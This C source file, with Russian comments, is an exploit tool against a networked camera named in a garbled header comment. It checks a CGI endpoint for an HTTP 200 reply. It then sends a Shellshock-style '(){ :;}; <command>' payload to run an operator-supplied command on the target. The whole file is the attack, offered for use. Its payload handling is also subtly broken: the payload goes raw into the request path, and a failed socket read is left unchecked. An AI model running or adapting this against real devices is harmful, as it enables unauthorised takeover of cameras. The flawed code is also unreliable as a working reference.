// "5.02024 G-Cam/EFD-2250

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 4096

// Функция для отправки HTTP GET-запроса
char* http_get(const char *target_ip, int port, const char *path) {
    int sock;
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];
    int bytes_received;

    // Создание сокета
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Настройка адреса сервера
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Подключение к серверу
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return NULL;
    }

    // Формирование HTTP GET-запроса
    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n"
             "\r\n", path, target_ip);

    // Отправка запроса
    send(sock, request, strlen(request), 0);

    // Чтение ответа
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    response[bytes_received] = '\0'; // Завершение строки

    // Закрытие сокета
    close(sock);

    // Возвращение ответа
    return strdup(response); // Копируем строку для возврата
}

// Функция для проверки уязвимости
int check_vulnerability(const char *target_ip, int port) {
    char *response = http_get(target_ip, port, "/uapi-cgi/viewer/simple_loglistjs.cgi");
    if (response == NULL) {
        return 0; // Ошибка при выполнении запроса
    }

    // Проверка наличия ответа
    int is_vulnerable = strstr(response, "HTTP/1.1 200 OK") != NULL; // Проверяем, что ответ успешный
    free(response); // Освобождение памяти
    return is_vulnerable; // Возвращаем результат проверки
}

// Функция для выполнения команды
void execute_command(const char *target_ip, int port, const char *cmd) {
    char payload[BUFFER_SIZE];
    snprintf(payload, sizeof(payload), "(){ :;}; %s", cmd);
    char *response = http_get(target_ip, port, payload);

    if (response) {
        printf("Command executed: %s\n", response);
        free(response); // Освобождение памяти
    } else {
        printf("Failed to execute command.\n");
    }
}

// Основная функция
int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <target_ip> <target_port> <command>\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    const char *command = argv[3];

    if (check_vulnerability(target_ip, target_port)) {
        execute_command(target_ip, target_port, command);
    }

    return 0;
}
